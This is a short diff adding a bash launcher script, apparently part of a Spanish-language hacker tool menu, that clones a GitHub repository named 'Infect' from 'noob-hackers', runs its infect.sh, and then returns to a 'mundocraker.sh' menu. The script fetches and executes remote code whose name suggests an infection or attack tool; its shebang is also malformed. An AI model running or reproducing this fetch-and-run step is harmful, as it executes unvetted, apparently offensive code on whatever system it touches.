@@ -1,0 +1,9 @@
+#!bin/bash
+#creador
+git clone https://github.com/noob-hackers/Infect
+cd infect
+bash infect.sh
+sleep 10
+cd ..
+cd ..
+bash mundocraker.sh
